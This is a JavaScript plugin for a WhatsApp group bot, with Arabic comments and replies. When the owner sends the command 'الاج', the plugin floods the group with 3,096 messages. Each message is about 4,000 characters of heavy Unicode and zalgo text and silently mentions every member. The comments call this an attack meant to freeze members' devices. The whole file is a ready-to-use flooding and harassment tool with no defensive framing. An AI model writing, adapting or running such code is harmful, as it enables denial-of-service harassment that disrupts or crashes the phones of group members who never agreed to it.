let handler = async (m, { conn, isOwner, participants }) => {
    if (!isOwner) return m.reply('❌ ~ هذا الأمر للمطور فقط');
    if (!m.isGroup) return m.reply('❌ ~ يعمل في الجروبات فقط');

    const groupId = m.chat;
    const total = 3096;
    const delay = 2000;

    // ─── إيقاف الهجوم الجاري (لو فيه) ───
    if (global.attackActive?.[groupId]) {
        global.attackActive[groupId] = false;
        return m.reply('🛑 ~ تم إيقاف الهجوم');
    }

    // ─── نص ثقيل جداً (~4000 حرف) ───
    // أحرف يونيكود ثقيلة + تكرار
    const heavyBase = '𝐒𝐎𝐕𝐄𝐑𝐄𝐈𝐆𝐍 𝐗 𝐒𝐋𝐀𝐕𝐄𝐒';
    const zalgo = '̷̛̛̣̰̖̻͉͎̲̼̤̪̹̠̩̫̲̩̪̬̗̥̣̝͇̫͚̠̪̲̟̮̺̜̹̠̩̫̲̩̪̬̗̥̣̝͇̫͚̠̪̲̟̮̺̜';
    const heavyText = (heavyBase + zalgo + ' ').repeat(80).substring(0, 4000);

    // ─── بدء الهجوم ───
    if (!global.attackActive) global.attackActive = {};
    global.attackActive[groupId] = true;

    const allMentions = participants.map(p => p.id);

    await m.reply(
        `🚀 ~ بدء الهجوم\n` +
        `📊 ~ الهدف: ${total} رسالة\n` +
        `⏱️ ~ التأخير: ${delay / 1000}ث\n` +
        `⏳ ~ الوقت المتوقع: ~${Math.ceil((total * delay) / 60000)} دقيقة\n` +
        `⚠️ ~ أرسل .الاج مرة تانية لإيقافه`
    );

    let sent = 0;

    for (let i = 1; i <= total; i++) {
        if (!global.attackActive[groupId]) {
            await m.reply(`🛑 ~ الهجوم متوقف عند ${sent}`);
            break;
        }

        try {
            await conn.sendMessage(groupId, {
                text: `${heavyText}\n\n⚠️ [${i}/${total}] 𝐒𝐎𝐕𝐄𝐑𝐄𝐈𝐆𝐍 𝐗`,
                mentions: allMentions // ← منشن صامت للكل في كل رسالة = تهنيج أقوى
            });
            sent++;

            // تحديث كل 50 رسالة
            if (i % 50 === 0) {
                await m.reply(`📊 ~ التقدم: ${i}/${total} | 📨 ~ تم: ${sent}`);
            }

            await new Promise(r => setTimeout(r, delay));

        } catch (e) {
            console.error(`Error at ${i}:`, e.message);
            await m.reply(`❌ ~ توقف عند ${i}\n💥 ~ السبب: ${e.message}`);
            break;
        }
    }

    delete global.attackActive[groupId];
    await m.reply(`✅ ~ انتهى الهجوم\n📨 ~ إجمالي المرسل: ${sent}/${total}`);
};

handler.command = ['الاج'];
handler.owner = true;
handler.group = true;

export default handler;
